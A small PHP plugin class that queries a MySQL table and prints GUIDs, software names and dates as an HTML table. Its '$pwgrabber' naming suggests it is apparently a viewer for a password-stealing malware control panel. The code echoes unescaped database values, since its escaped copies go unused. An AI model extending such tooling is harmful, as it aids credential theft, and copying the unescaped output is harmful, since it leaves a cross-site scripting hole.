<?php

class main
{
    private $MySQL;
    private $PluginName;

    public function __construct()
    {
        include('info.php');

        $this->MySQL = new MySQL(HOST, USER, PASS, DB);
        $this->PluginName = str_replace(' ', '', trim(strtolower($PLUGIN_NAME)));
    }

    /*
     * Run plugin
     */
    public function run()
    {
        $code = '<table id="tablecss"><tr><th>GUID</th><th>Software</th><th>Creation Date</th></tr>';

        $this->MySQL->doQuery('SELECT ID, GUID, software,creationDate, HEX(GUID) AS GUIDString FROM `plugin_' . $this->PluginName . '`');
        $i = 0;
        while ($pwgrabber = $this->MySQL->arrayResult()) {
            foreach ($pwgrabber as $key => $value) {
                $task[$key] = htmlentities($pwgrabber[$key]);
            }

            $class = ($i % 2) ? 'alt' : '';
            $code .= '<tr class="' . $class . '"><td>' . $pwgrabber['GUIDString'] . '</td><td>' . $pwgrabber['software'] . '</td>';



            $code .= '<td>' . $pwgrabber['creationDate'] . '</td>';

            $code .= '</tr>';
            $i++;
        }

        $code .= '</table>';
        return $code;
    }

    /*
     * Insert data
     */

    public function insertData()
    {

    }
}